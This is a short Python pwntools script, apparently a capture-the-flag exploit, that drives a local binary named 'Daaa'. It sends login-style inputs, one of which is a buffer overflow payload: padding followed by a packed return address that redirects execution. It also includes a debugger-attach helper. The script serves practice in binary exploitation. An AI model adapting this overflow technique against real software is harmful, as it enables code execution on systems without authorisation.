from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
def z():
	gdb.attach(cn)
	raw_input()
cn = process('./Daaa')

cn.recv()
cn.sendline('xman '+'1')

cn.recv()
cn.sendline('cyberp'+'1'*0x10+p32(0x080488A0))
cn.recv()
#z()
cn.sendline('login')
cn.recv()